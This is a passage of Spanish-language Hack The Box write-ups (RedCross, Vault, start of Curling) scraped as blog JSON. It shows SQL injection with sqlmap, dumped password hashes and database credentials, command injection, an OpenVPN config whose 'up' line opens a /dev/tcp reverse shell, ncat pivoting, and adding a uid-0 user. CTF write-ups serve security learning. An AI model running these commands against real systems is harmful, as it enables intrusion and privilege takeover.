/usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -k -np -t 30 -x php,html,txt,pdf,doc ===================================================== Gobuster v2.0.0 OJ Reeves (@TheColonial) ===================================================== [+] Mode : dir [+] Url/Domain : https://intra.redcross.htb/ [+] Threads : 30 [+] Wordlist : /usr/share/wordlists/dirb/common.txt [+] Status codes : 200,204,301,302,307,403 [+] Extensions : php,html,txt,pdf,doc [+] Timeout : 10s ===================================================== /documentation (Status: 301) /images (Status: 301) /index.php (Status: 302) /index.php (Status: 302) /init.php (Status: 200) /javascript (Status: 301) /pages (Status: 301) ===================================================== Se realizo de la misma manera para el directorio /documentation y nos encontramos con un documento.\n1 2 3 4 gobuster -u https://intra.redcross.htb -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -k -np -t 30 -x php,html,txt,pdf,doc ===================================================== account-signup.pdf ===================================================== Nos dice que si queremos un acceso a la plataforma debemos llenar un formulario en https://intra.redcross.htb/?page=contact con subject \u0026ldquo;credentials\u0026rdquo; y en el cuerpo del formulario la contraseña del usuario que queremos.\nSQLI Nos logueamos con el usuario y contraseña, al analizar los directorios y paginas, encontramos una vulnerabilidad SQLi en: https://intra.redcross.htb/?o=1'-- -\u0026amp;page=app\nUtilizamos burpsuite para capturar el trafico y capturar una solicitud de la SQLi para luego hacer uso de sqlmap con la solicitud, para luego encontrar usuarios y contraseñas, tambien encontramos mensajes de correos electronicos entre los administradores.\n1 2 3 4 5 6 7 8 9 10 GET /?o=1\u0026amp;page=app HTTP/1.1 Host: intra.redcross.htb User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: https://intra.redcross.htb/?page=app Cookie: PHPSESSID=vo690q6cktgv56j97dabra5bm3; LANG=EN_US; SINCE=1547616286; LIMIT=10; DOMAIN=intra Connection: close Upgrade-Insecure-Requests: 1 SQLMAP 1 sqlmap -r sql.req --batch --level=5 --risk=3 -D redcross -T users --dump 1 2 3 4 5 6 7 8 9 10 11 12 Database: redcross Table: users [5 entries] +----+------+------------------------------+----------+--------------------------------------------------------------+ | id | role | mail | username | password | +----+------+------------------------------+----------+--------------------------------------------------------------+ | 1 | 0 | admin@redcross.htb | admin | $2y$10$z/d5GiwZuFqjY1jRiKIPzuPXKt0SthLOyU438ajqRBtrb7ZADpwq. | | 2 | 1 | penelope@redcross.htb | penelope | $2y$10$tY9Y955kyFB37GnW4xrC0.J.FzmkrQhxD..vKCQICvwOEgwfxqgAS | | 3 | 1 | charles@redcross.htb | charles | $2y$10$bj5Qh0AbUM5wHeu/lTfjg.xPxjRQkqU6T8cs683Eus/Y89GHs.G7i | | 4 | 100 | tricia.wanderloo@contoso.com | tricia | $2y$10$Dnv/b2ZBca2O4cp0fsBbjeQ/0HnhvJ7WrC/ZN3K7QKqTa9SSKP6r. | | 5 | 1000 | non@available | guest | $2y$10$U16O2Ylt/uFtzlVbDIzJ8us9ts8f9ITWoPAWcUfK585sZue03YBAi | +----+------+------------------------------+----------+--------------------------------------------------------------+ 1 2 3 4 5 6 7 8 9 10 11 12 Database: redcross Table: messages [8 entries] id,body,dest,origin,subject 1,You\u0026#39;re granted with a low privilege access while we\u0026#39;re processing your credentials request. Our messaging system still in beta status. Please report if you find any incidence.,5,1,Guest Account Info 2,\u0026#34;Hi Penny, can you check if is there any problem with the order? I\u0026#39;m not receiving it in our EDI platform.\u0026#34;,2,4,Problems with order 02122128 3,\u0026#34;Please could you check the admin webpanel? idk what happens but when I\u0026#39;m checking the messages, alerts popping everywhere!! Maybe a virus?\u0026#34;,3,1,Strange behavior 4,\u0026#34;Hi, Please check now... Should be arrived in your systems. Please confirm me. Regards.\u0026#34;,4,2,Problems with order 02122128 5,\u0026#34;Hey, my chief contacted me complaining about some problem in the admin webapp. I thought that you reinforced security on it... Alerts everywhere!!\u0026#34;,2,3,admin subd webapp problems 6,\u0026#34;Hi, Yes it\u0026#39;s strange because we applied some input filtering on the contact form. Let me check it. I\u0026#39;ll take care of that since now! KR\u0026#34;,3,2,admin subd webapp problems (priority) 7,\u0026#34;Hi, Please stop checking messages from intra platform, it\u0026#39;s possible that there is a vuln on your admin side... \u0026#34;,1,2,STOP checking messages from intra (priority) 8,Sorry but I can\u0026#39;t do that. It\u0026#39;s the only way we have to communicate with partners and we are overloaded. Doesn\u0026#39;t look so bad... besides that what colud happen? Don\u0026#39;t worry but fix it ASAP.,2,1,STOP checking messages from intra (priority) Con la vulnerabilidad SQLi solo se pudo sacar mensajes y usuarios, no se pudo ir más alla (shell, lectura, escritura de archivos,etc). Intentando crackear las contraseñas con hashcat solo logramos sacar dos pero no sirvieron de mucho:\n1 2 guest:$2y$10$U16O2Ylt/uFtzlVbDIzJ8us9ts8f9ITWoPAWcUfK585sZue03YBAi:guest charles:$2y$10$bj5Qh0AbUM5wHeu/lTfjg.xPxjRQkqU6T8cs683Eus/Y89GHs.G7i:cookiemonster Pero los mensajes nos dan una idea de lo que podriamos hacer, hablan de admin webpanel el cual no pudimos encontrar con gobuster, pero podria ser algo más que un directorio, un subdominio.\n1 10.10.10.113\tredcross.htb intra.redcross.htb admin.redcross.htb webpanel.redcross.htb Al visitar webpanel.redcross.htb solo nos redirige de nuevo a intra.redcross.htb, pero si visitamos admin.redcross.htb, nos muestra un nuevo panel de administracion.\nIntentamos utilizar los mismos credenciales pero nos muestra un mensaje:\n1 Not enough privileges! COOKIES Ya que el subdominio intra y admin pertenecen a la misma maquina intentamos utilizar las cookies del subdominio intra en el de admin utilizando Cookie Manager con los cuales pudimos logearnos como usuario guest.\nObservamos dos User Management, Network Access, en la primera opcion podemos borrar y agregar usuarios, y el server nos genera una contraseña que podemos utilizar para logearnos mediante ssh.\nAgregamos un Usuario\nNos devuelve el usuario y contraseña\nNos logeamos con las credenciales al servicio ssh\nCon el usuario que creamos(nemesis) no pudimos hacer mucho, pero encontramos un archivo \u0026lsquo;iptctl.c\u0026rsquo;, el cual restringe o permite el acceso a la maquina, añadiendo una IP.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 /* * Small utility to manage iptables, easily executable from admin.redcross.htb * v0.1 - allow and restrict mode * v0.3 - added check method and interactive mode (still testing!) */ #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;arpa/inet.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #define BUFFSIZE 360 int isValidIpAddress(char *ipAddress) { struct sockaddr_in sa; int result = inet_pton(AF_INET, ipAddress, \u0026amp;(sa.sin_addr)); return result != 0; } int isValidAction(char *action){ int a=0; char value[10]; strncpy(value,action,9); if(strstr(value,\u0026#34;allow\u0026#34;)) a=1; if(strstr(value,\u0026#34;restrict\u0026#34;)) a=2; if(strstr(value,\u0026#34;show\u0026#34;)) a=3; return a; } void cmdAR(char **a, char *action, char *ip){ a[0]=\u0026#34;/sbin/iptables\u0026#34;; a[1]=action; a[2]=\u0026#34;INPUT\u0026#34;; a[3]=\u0026#34;-p\u0026#34;; a[4]=\u0026#34;all\u0026#34;; a[5]=\u0026#34;-s\u0026#34;; a[6]=ip; a[7]=\u0026#34;-j\u0026#34;; a[8]=\u0026#34;ACCEPT\u0026#34;; a[9]=NULL; return; } void cmdShow(char **a){ a[0]=\u0026#34;/sbin/iptables\u0026#34; ; a[1]=\u0026#34;-L\u0026#34;; a[2]=\u0026#34;INPUT\u0026#34;; return; } void interactive(char *ip, char *action, char *name){ char inputAddress[16]; char inputAction[10]; printf(\u0026#34;Entering interactive mode\\n\u0026#34;); printf(\u0026#34;Action(allow|restrict|show): \u0026#34;); fgets(inputAction,BUFFSIZE,stdin); fflush(stdin); printf(\u0026#34;IP address: \u0026#34;); fgets(inputAddress,BUFFSIZE,stdin); fflush(stdin); inputAddress[strlen(inputAddress)-1] = 0; if(! isValidAction(inputAction) || ! isValidIpAddress(inputAddress)){ printf(\u0026#34;Usage: %s allow|restrict|show IP\\n\u0026#34;, name); exit(0); } strcpy(ip, inputAddress); strcpy(action, inputAction); return; } int main(int argc, char *argv[]){ int isAction=0; int isIPAddr=0; pid_t child_pid; char inputAction[10]; char inputAddress[16]; char *args[10]; char buffer[200]; if(argc!=3 \u0026amp;\u0026amp; argc!=2){ printf(\u0026#34;Usage: %s allow|restrict|show IP_ADDR\\n\u0026#34;, argv[0]); exit(0); } if(argc==2){ if(strstr(argv[1],\u0026#34;-i\u0026#34;)) interactive(inputAddress, inputAction, argv[0]); } else{ strcpy(inputAction, argv[1]); strcpy(inputAddress, argv[2]); } isAction=isValidAction(inputAction); isIPAddr=isValidIpAddress(inputAddress); if(!isAction || !isIPAddr){ printf(\u0026#34;Usage: %s allow|restrict|show IP\\n\u0026#34;, argv[0]); exit(0); } puts(\u0026#34;DEBUG: All checks passed... Executing iptables\u0026#34;); if(isAction==1) cmdAR(args,\u0026#34;-A\u0026#34;,inputAddress); if(isAction==2) cmdAR(args,\u0026#34;-D\u0026#34;,inputAddress); if(isAction==3) cmdShow(args); child_pid=fork(); if(child_pid==0){ setuid(0); execvp(args[0],args); exit(0); } else{ if(isAction==1) printf(\u0026#34;Network access granted to %s\\n\u0026#34;,inputAddress); if(isAction==2) printf(\u0026#34;Network access restricted to %s\\n\u0026#34;,inputAddress); if(isAction==3) puts(\u0026#34;ERR: Function not available!\\n\u0026#34;); } } Este archivo es utilizado en la segunda opcion del panel de administracion en Network Access, al acceder a la segunda opcion nos muestra las ip que fueron agregada a la lista, en la que tambien podemos denegar el acceso a una IP.\nRCE - Reverse SHELL El archivo que encontramos anteriormente fue compilado y probado localmente, el cual nos pide una opcion y una IP a la cual queremos autorizar|restringir|mostrar y al realizar un analisis a las peticiones al servidor con \u0026lsquo;Burpsuite\u0026rsquo; de esta pagina encontramos que podemos realizar una \u0026lsquo;Inyeccion de Comandos\u0026rsquo; mediante la opcion de denegar (\u0026lsquo;deny\u0026rsquo;) una IP y asi obtener una shell inversa con python.\nCommand Injection Your browser does not support the video tag.\rDIRECTORIOS PAGINA WEB Ya dentro de la maquina pudimos enumerar y descargar los archivos pertenecientes a la pagina web y su estructura es la siguiente.\nPRIVILEGE ESCALATION Creando un Usuario - ROOT Enumerando los archivos que se manejan en /var/www/html/* los cuales pertenecen a la pagina web de la maquina, encontramos varios usuarios y contraseñas a Bases de Datos.\n1 2 3 4 actions.php \u0026#34;host=127.0.0.1 dbname=unix user=unixusrmgr password=dheu%7wjx8B\u0026amp;\u0026#34; \u0026#34;host=127.0.0.1 dbname=redcross user=www password=aXwrtUO9_aa\u0026amp;\u0026#34; \u0026#34;host=127.0.0.1 dbname=unix user=unixnss password=fios@ew023xnw\u0026#34; 1 2 init.php $dbhost=\u0026#39;127.0.0.1\u0026#39;; $dbuser=\u0026#39;dbcross\u0026#39;; $dbpass=\u0026#39;LOSPxnme4f5pH5wp\u0026#39;;$dbname=\u0026#39;redcross\u0026#39;; Como pudimos observar, en el panel de administracion podemos crear usuarios, los cuales estan en el grupo de asociados y limitados a una sola carpeta /var/jail/. El codigo php que agrega usuarios a la base de datos.\n1 2 3 4 5 6 7 8 9 10 if($action===\u0026#39;adduser\u0026#39;){ $username=$_POST[\u0026#39;username\u0026#39;]; $passw=generateRandomString(); $phash=crypt($passw); $dbconn = pg_connect(\u0026#34;host=127.0.0.1 dbname=unix user=unixusrmgr password=dheu%7wjx8B\u0026amp;\u0026#34;); $result = pg_prepare($dbconn, \u0026#34;q1\u0026#34;, \u0026#34;insert into passwd_table (username, passwd, gid, homedir) values ($1, $2, 1001, \u0026#39;/var/jail/home\u0026#39;)\u0026#34;); $result = pg_execute($dbconn, \u0026#34;q1\u0026#34;, array($username, $phash)); echo \u0026#34;Provide this credentials to the user:\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026#34;; \u0026lt;--!echo \u0026#34;\u0026lt;b\u0026gt;$username : $passw\u0026lt;/b\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;a href=/?page=users\u0026gt;Continue\u0026lt;/a\u0026gt;\u0026#34;;--\u0026gt; } El action: adduser realiza una conexion a la base de datos unix y con el usuario \u0026lsquo;unixusrmgr\u0026rsquo; y realiza un query para insertar nombre de usuario, contraseña generada aleatoriamente y la encripta en crypt, gid o al grupo de usuarios que existen en la maquina (/etc/group - associates:x:1001:), tambien un directorio especifico para el usuario. Sabiendo esto podemos tomar ventaja de esta funcion y crear nuestro propio usuario.\nUtilizando las mismas credenciales en la base de datos en la que se crean los usuarios, encontramos la tabla llamada passwd_table, que contiene:\n1 2 3 4 5 6 7 8 9 username | passwd | uid | gid | gecos | homedir | shell ---------------+------------------------------------+------+------+-------+----------------+----------- ...\t....\t...\t...\t....\t....\t... greater | $1$bRaICuCW$oRz.QUxie1yqP5Jbi3Z1v/ | 2022 | 0 | | /root | /bin/bash mailadm | $1$bRaICuCW$oRz.QUxie1yqP5Jbi3Z1v/ | 2024 | 1000 | | /home/penelope | /bin/bash slot | $1$Zjw7H894$4mUPW1tgQmV5QVKUIOeKZ/ | 2027 | 1001 | | /var/jail/home | /bin/bash shadow | $1$bRaICuCW$oRz.QUxie1yqP5Jbi3Z1v/ | 2029 | 42 | | /home/ | /bin/bash goku | $1$bRaICuCW$oRz.QUxie1yqP5Jbi3Z1v/ | 2033 | 27 | | /home/ | /bin/bash adm | $1$Ca4NB5YL$1VBlUqIoGQg.LSqbiZ7FY/ | 2034 | 4 | | /home/penelope | /bin/bash Ya que el usuario unixusrmgr tiene permisos para insertar datos en esta tabla, podemos tomar ventaja e insertar nuestro propio usuario con permisos sudo a la base de datos, logearnos mediante ssh para luego poder crear y agregar un usuario con permisos(gid) root a la maquina.\n1 2 /usr/lib/postgresql/9.6/bin/psql -h 127.0.0.1 -U unixusrmgr unix Password: dheu%7wjx8B\u0026amp; Para crear la contraseña utilizamos la siguiente pagina: https://es.functions-online.com/crypt.html\n1 $1$Ca4NB5YL$1VBlUqIoGQg.LSqbiZ7FY/:greatstuff SQL - INSERT 1 insert into passwd_table(username, passwd, gid, homedir) values(\u0026#39;batman\u0026#39;, \u0026#39;$1$Ca4NB5YL$1VBlUqIoGQg.LSqbiZ7FY/\u0026#39;, \u0026#39;27\u0026#39;, \u0026#39;/root\u0026#39;); Crear Usuario Sudo Update: ya que el usuario pertenece al grupo sudo esta ultima accion no era necesaria, basta con ejecutar sudo su.\n1 2 3 sudo useradd -ou 0 -g 0 happy sudo passwd happy su happy Grant Root Access Your browser does not support the video tag.\r","description":"En RedCross realizamos una enumeracion a un subdominos donde encontramos una funcion de la aplicacion web que nos permite crear un acceso temporal por SSH a una shell limitada, dentro de los parametros de esta accion descrita realizamos Command Inyeccion lo que nos dio acceso aun primer usuario. Finalmente tomamos ventaja de una funcionalidad de la aplicacion para agregar un usario y obtener acceso root.","id":209,"section":"posts","tags":["sqli","sqlmap","command injection","rce"],"title":"Hack The Box - RedCross","uri":"https://sckull.github.io/posts/redcross/"},{"content":"\rEn Vault obtuvimos acceso tras ejecutar una shell inversa en una web shell. Enumeramos la red para obtener acceso a una aplicacion donde ejecutamos una shell con una configuracion de OpenVPN. Finalmente encontramos nuestra flag root encriptada la cual obtuvimos utilizando una llave registrada en un usuario al que ya teniamos acceso.\nNombre Vault OS Linux Puntos 30 Dificultad Media IP 10.10.10.109 Maker nol0gz\nMatrix\r{\r\u0026#34;type\u0026#34;:\u0026#34;radar\u0026#34;,\r\u0026#34;data\u0026#34;:{\r\u0026#34;labels\u0026#34;:[\u0026#34;Enumeration\u0026#34;,\u0026#34;Real-Life\u0026#34;,\u0026#34;CVE\u0026#34;,\u0026#34;Custom Explotation\u0026#34;,\u0026#34;CTF-Like\u0026#34;],\r\u0026#34;datasets\u0026#34;:[\r{\r\u0026#34;label\u0026#34;:\u0026#34;User Rate\u0026#34;, \u0026#34;data\u0026#34;:[8.5, 8, 5.3, 4.7, 2],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(75, 162, 189,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#4ba2bd\u0026#34;\r},\r{ \u0026#34;label\u0026#34;:\u0026#34;Maker Rate\u0026#34;,\r\u0026#34;data\u0026#34;:[4, 10, 7, 3, 0],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(154, 204, 20,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#9acc14\u0026#34;\r}\r]\r},\r\u0026#34;options\u0026#34;: {\u0026#34;scale\u0026#34;: {\u0026#34;ticks\u0026#34;: {\u0026#34;backdropColor\u0026#34;:\u0026#34;rgba(0,0,0,0)\u0026#34;},\r\u0026#34;angleLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;},\r\u0026#34;gridLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;}\r}\r}\r} MASSCAN \u0026amp; NMAP Escaneo a todos los puertos UDP/TCP.\n1 2 3 4 5 6 Starting masscan 1.0.4 (http://bit.ly/14GZzcT) -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth Initiating SYN Stealth Scan Scanning 1 hosts [131070 ports/host] Discovered open port 22/tcp on 10.10.10.109 Discovered open port 80/tcp on 10.10.10.109 Escaneo a puertos 22, 80.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 Starting Nmap 7.70 ( https://nmap.org ) Nmap scan report for 10.10.10.109 Host is up (0.42s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 a6:9d:0f:7d:73:75:bb:a8:94:0a:b7:e3:fe:1f:24:f4 (RSA) | 256 2c:7c:34:eb:3a:eb:04:03:ac:48:28:54:09:74:3d:27 (ECDSA) |_ 256 98:42:5f:ad:87:22:92:6d:72:e6:66:6c:82:c1:09:83 (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Site doesn\u0026#39;t have a title (text/html; charset=UTF-8). Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 13.97 seconds HTTP Puerto 80 http encontramos una pagina solo con el siguiente contenido, en el que anuncian a un nuevo cliente \u0026lsquo;Sparklays\u0026rsquo; pero su pagina (Sparklays.com) aun esta en construccion por lo que no puede ser accedida.\nAgregamos todas las palabras posibles del contenido de la pagina a un diccionario para gobuster utilizando cewl.\n1 cewl -w vault_custom.txt http://10.10.10.109/ \u0026amp;\u0026amp; tr \u0026#39;A-Z\u0026#39; \u0026#39;a-z\u0026#39; \u0026lt; vault_custom.txt \u0026gt; vault_lower.txt \u0026amp;\u0026amp; cat vault_custom.txt vault_lower.txt \u0026gt;\u0026gt; /usr/share/wordlist/dirb/common.txt DIRBUSTER Utilizando dirbuster encontramos las siguientes rutas.\n/admin.php /login.php /design/design.html /design/changelogo.php /design/uploads/ SIMPLE PHP SHELL Para obtener una shell vamos a concentrarnos en changelogo.php es la unica ruta donde podemos subir archivos y considerando que, al subir un archivo se guarda en /uploads/ podremos ejecutar nuestro payload o comandos, para ello vamos a copiar un webshell que kali trae en su sistema.\nEnumerando los directorios nos encontramos con un archivo ssh que contiene el nombre de Dave y un aposible contraseña para el servicio ssh.\nSHELL - SSH Satisfactoriamente nos logeamos con las credenciales para el usuario dave.\nDentro de los archivos de dave encontramos dos archivos mas key y Servers.\nServers contiene IPs y el nombre que tiene cada una de ellas, y en key una \u0026ldquo;contraseña\u0026rdquo;, nmap no esta instalado en la maquina por lo que vamos a utilizar netcat para hacer un escaneo de los puertos de cada ip que nos aparece en el archivo Servers.\nNETCAT =\u0026gt; https://www.cyberciti.biz/faq/linux-port-scanning/\nDentro de las interfaces encontramos una interna en la cual nos identificamos con la ip 192.168.122.1.\nPrimero verificamos si hay mas de una IP disponible en un rango del 1 al 10.\nAhora sabemos que existen otras dos IP dentro de la interfaz virbr0 (192.168.122.5, 192.168.122.4) y por ahora solo tenemos acceso a una 192.168.122.1.\nEscaneo de puertos por IP\nPodemos observar que la IP 192.168.122.4 tiene dos puertos abiertos 80 y 22, mientras que la otra IP 192.168.122.5 netcat no encontro ningun puerto abierto pero si esta activa la direccion IP.\nTUNELING SSH Vamos a traer localmente la IP 192.168.122.4 y su puerto 80 a nuestra maquina, para poder analizar el puerto 80.\n1 ssh -L 9090:192.168.122.4:80 dave@10.10.10.109 Ejecutamos el comando localmente.\nRevisamos si el puerto esta a la escucha localmente.\nProcedemos a abrir 127.0.0.1:9090 en firefox para ver que contenido tiene.\n/DNS Settings Esta pagina no existe por lo que no encontramos nada.\n/VPN Configuration Al parecer es una pagina para modificar y executar archivo ovpn\nSHELL INVERSA - OVPN En https://medium.com/tenable-techblog/reverse-shell-from-an-openvpn-configuration-file-73fd8b1d38da nos muestran como se puede realizar una shell inversa con las siguiente configuracion:\n1 2 3 4 5 remote 192.168.1.245 ifconfig 10.200.0.2 10.200.0.1 dev tun script-security 2 up \u0026#34;/bin/bash -c \u0026#39;/bin/bash -i \u0026gt; /dev/tcp/192.168.1.218/8181 0\u0026lt;\u0026amp;1 2\u0026gt;\u0026amp;1\u0026amp;\u0026#39;\u0026#34; Como referencia para realizar una shell inversa tomamos la documentacion de openvpn (https://openvpn.net/community-resources/reference-manual-for-openvpn-2-4/) para realizar algunos cambios, y este es el resultado:\n1 2 3 4 5 remote 192.168.122.4 dev tun nobind script-security 2 up \u0026#34;/bin/bash -c \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/192.168.122.1/9999 0\u0026gt;\u0026amp;1\u0026#39;\u0026#34; Ya que la IP donde esta corriendo la pagina es 192.168.122.4 vamos a obtener una shell inversa de esa maquina, por lo que en la maquina dave (192.168.122.1) vamos a poner a la escucha netcat y asi obtener nuestra shell.\nPresionamos Test VPN\nY obtenemos nuestra shell inversa\nY nuestra bandera USER\nDe igual forma encontramos un archivo ssh que contiene credenciales de lo que parece ser ssh para el usuario dave.\n1 2 3 SSH dave 192.168.122.4 dave dav3gerous567 Intentamos logearnos y satisfactoriamente tenemos acceso por medio de ssh a 192.168.122.4.\nNuestro progreso hasta ahora\nEnumerando dentro de 192.168.122.4 encontramos en el historial de comandos (.bash_history) una conexion a 192.168.5.2 por el puerto 987 utilizando netcat por el puerto local 5555, tambien un escaneo de nmap a esa misma ip.\nIntentamos hacer un escaneo a esa IP 192.168.5.2.\nDentro de la carpeta /var/www/DNS encontramos un archivo llamado interfaces, vemos que se han agregado nuevas rutas estaticas a la tabla de enrutamiento.\nLa ruta de destino que tenga 192.168.5.0 sera redirigido a la puerta de enlace 192.168.122.5 por medio de la interfaz ens3.\nTercera IP (192.168.5.2) ROOT - FLAG Vamos a utilizar el mismo comando que esta en el historial para poder conectarnos a 192.168.5.2.\n1 ncat -l 5555 --sh-exec \u0026#34;ncat 192.168.5.2 987 --source-port=4444\u0026#34; \u0026amp; Obtenemos nuestra shell en 192.168.5.2 y nuestra bandera root pero esta encriptada y necesitamos una clave.\nNuestra tercer maquina Anteriormente habiamos encontrado un archivo key en 192.168.122.1 con una frase, para extraer la informacion de nuestra bandera encriptada vamos trasferir el archivo a donde esta la key.\nPara escapar de la shell utilizamos:\n1 find / -exec sh -i \\; Trensferir root.txt.gpg Para transferir nuestro archivo vamos a hacer algo similar a lo que hicimos para la conexion ssh a 192.168.5.2.\n1 ncat -l 5555 --sh-exec \u0026#34;ncat 192.168.5.2 987 --source-port=4444\u0026#34; \u0026amp; 1 scp -P 5555 dave@192.168.122.4:/home/dave/root.txt.gpg . Ahora necesitamos transferirlo a 192.168.122.1 donde esta nuestra key, codificamos root.txt.gpg en base64.\nDecodificamos el archivo.\nDesencriptamos con la frase que esta en el archivo key y obtenemos nuestra bandera root.\n","description":"En Vault obtuvimos acceso tras ejecutar una shell inversa en una web shell. Enumeramos la red para obtener acceso a una aplicacion donde ejecutamos una shell con una configuracion de OpenVPN. Finalmente encontramos nuestra flag root encriptada la cual obtuvimos utilizando una llave registrada en un usuario al que ya teniamos acceso.","id":210,"section":"posts","tags":["openvpn","cewl"],"title":"Hack The Box - Vault","uri":"https://sckull.github.io/posts/vault/"},{"content":"\rCurling, encontramos credenciales tras enumerar Joomla y mediante una extension obtuvimos acceso a la maquina. Un pequeño reto nos permitio obtener una contraseña para realizar movimiento lateral. Para escalar privilegios se muestran dos formas, ejecutando el exploit Dirty Sock y modificando el archivo Sudoers mediante Curl y un CronJob.\nNombre Curling OS Linux Puntos 20 Dificultad Facil IP 10.10.10.150 Maker L4mpje\nMatrix\r{\r\u0026#34;type\u0026#34;:\u0026#34;radar\u0026#34;,\r\u0026#34;data\u0026#34;:{\r\u0026#34;labels\u0026#34;:[\u0026#34;Enumeration\u0026#34;,\u0026#34;Real-Life\u0026#34;,\u0026#34;CVE\u0026#34;,\u0026#34;Custom Explotation\u0026#34;,\u0026#34;CTF-Like\u0026#34;],\r\u0026#34;datasets\u0026#34;:[\r{\r\u0026#34;label\u0026#34;:\u0026#34;User Rate\u0026#34;, \u0026#34;data\u0026#34;:[6, 5.3, 5.1, 4.9, 4.7],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(75, 162, 189,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#4ba2bd\u0026#34;\r},\r{ \u0026#34;label\u0026#34;:\u0026#34;Maker Rate\u0026#34;,\r\u0026#34;data\u0026#34;:[7, 7, 7, 3, 3],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(154, 204, 20,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#9acc14\u0026#34;\r}\r]\r},\r\u0026#34;options\u0026#34;: {\u0026#34;scale\u0026#34;: {\u0026#34;ticks\u0026#34;: {\u0026#34;backdropColor\u0026#34;:\u0026#34;rgba(0,0,0,0)\u0026#34;},\r\u0026#34;angleLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;},\r\u0026#34;gridLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;}\r}\r}\r} MASSCAN \u0026amp; NMAP 1 2 3 4 5 6 7 8 root@sckull:~/htb/curling# masscan -p1-65535,U:1-65535 10.10.10.150 --rate=1000 -e tun0 Starting masscan 1.0.4 (http://bit.ly/14GZzcT) -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth Initiating SYN Stealth Scan Scanning 1 hosts [131070 ports/host] Discovered open port 80/tcp on 10.10.10.150 Discovered open port 22/tcp on 10.10.10.150 Escaneo al puerto 80 y 22\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 Starting Nmap 7.70 ( https://nmap.org ) Nmap scan report for 10.10.10.150 Host is up (0.29s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 8a:d1:69:b4:90:20:3e:a7:b6:54:01:eb:68:30:3a:ca (RSA) | 256 9f:0b:c2:b2:0b:ad:8f:a1:4e:0b:f6:33:79:ef:fb:43 (ECDSA) |_ 256 c1:2a:35:44:30:0c:5b:56:6a:3f:a5:cc:64:66:d9:a9 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-generator: Joomla! - Open Source Content Management |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Home Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Device type: general purpose Running: Linux 2.6.X OS CPE: cpe:/o:linux:linux_kernel:2.6 OS details: Linux 2.6.18 - 2.6.22 Network Distance: 2 hops Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE (using port 22/tcp) HOP RTT ADDRESS 1 707.63 ms 10.10.12.1 2 707.82 ms 10.10.10.150 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 26.56 seconds HTTP 80 Al visitar la pagina en el puerto 80 encontramos una pagina sencilla con varios post, en donde tambien vemos el nombre de Floris y Super User que puede referirse a administrator.\nGOBUSTER Escaneo de directorios y archivos html, php y txt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 root@sckull:~/htb/curling# gobuster -u http://10.10.10.150/ -w /usr/share/wordlists/dirb/common.txt -q -np -x html,php,txt -t 30 /administrator (Status: 301) /bin (Status: 301) /cache (Status: 301) /components (Status: 301) /configuration.php (Status: 200) /images (Status: 301) /includes (Status: 301) /index.php (Status: 200) /index.php (Status: 200) /language (Status: 301) /layouts (Status: 301) /libraries (Status: 301) /LICENSE.txt (Status: 200) /media (Status: 301) /modules (Status: 301) /plugins (Status: 301) /README.txt (Status: 200) /secret.txt (Status: 200) /server-status (Status: 403) /templates (Status: 301) /tmp (Status: 301) /web.config.txt (Status: 200) Dentro de los directorios y archivos encontrados vemos uno no muy comun /secret.txt al 